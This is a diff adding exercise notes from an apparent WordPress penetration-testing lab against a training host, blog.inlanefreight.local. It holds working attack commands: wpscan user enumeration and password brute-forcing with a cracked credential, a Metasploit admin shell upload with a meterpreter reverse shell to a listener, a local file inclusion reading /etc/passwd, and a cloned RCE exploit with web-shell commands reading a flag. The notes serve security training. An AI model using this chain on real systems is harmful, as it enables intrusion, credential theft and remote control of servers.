@@ -68,3 +68,58 @@ The PL allows for file upload
 ```bash
 gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt_
 ```
+
+# Exercise 2
+```bash
+wpscan --url http://blog.inlanefreight.local --enumerate u
+
+wpscan --url http://blog.inlanefreight.local --usernames doug --passwords /usr/share/wordlists/rockyou.txt
+doug / jessica1
+```
+
+```bash
+msf exploit(unix/webapp/wp_admin_shell_upload) > show options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting           Required  Description
+   ----       ---------------           --------  -----------
+   PASSWORD   jessica1                  yes       The WordPress password to authenticate with
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, so
+                                                  cks5, socks5h
+   RHOSTS     10.129.173.86             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80                        yes       The target port (TCP)
+   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                         yes       The base path to the wordpress application
+   USERNAME   doug                      yes       The WordPress username to authenticate with
+   VHOST      blog.inlanefreight.local  no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.16.28      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/webapp/wp_admin_shell_upload) > run
+
+curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+
+# Remote cod Exec
+git clone https://github.com/Piuliss/wordpress-vul-wpdiscuzz.git   
+python3 49967.py -u http://blog.inlanefreight.local -p "/?p=1"  
+curl "http://blog.inlanefreight.local/wp-content/uploads/2026/09/rjuetotafhibnwr-1790643577.0149.php?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
+
+```
